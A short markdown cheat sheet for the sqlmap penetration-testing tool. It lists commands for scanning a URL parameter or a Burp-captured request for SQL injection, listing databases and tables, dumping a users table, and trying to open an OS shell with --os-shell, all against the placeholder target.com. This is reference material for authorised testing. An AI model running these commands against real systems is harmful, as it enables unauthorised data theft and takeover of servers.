---
title: "sqlMap"
---


sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.

[sqlMap GitHub Repository](https://github.com/sqlmapproject/sqlmap)

## Simple Scan (GET Request)

```bash
# Basic target URL scan
sqlmap -u "http://target.com/page.php?id=1" --batch

# Scan with custom parameters
sqlmap -u "http://target.com/page.php?id=1" -p id --level=3 --risk=2
```

## Scan via POST File (Captured from Burp)

```bash
# Capture request with Burp, save to file (request.txt) and scan
sqlmap -r request.txt

# Specify the parameter to test in the request
sqlmap -r request.txt -p username
```

## Enumeration & Privilege Escalation

```bash
# Get databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# List tables from a specific database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Dump columns and entries from a specific table
sqlmap -u "http://target.com/page.php?id=1" -D db_name -T users --columns --dump

# Try to spawn an interactive OS shell (if database privileges permit)
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```
